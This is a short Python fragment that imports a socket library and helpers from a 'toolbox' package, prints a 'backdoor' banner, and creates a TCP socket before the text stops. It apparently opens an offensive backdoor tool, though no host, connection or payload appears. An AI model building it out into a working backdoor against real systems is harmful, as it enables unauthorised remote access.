import socket

from toolbox.print.banner import *
from toolbox.print.clprinter import *

print_horizontal_delimiter()
print_backdoor_banner()
print_horizontal_delimiter()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
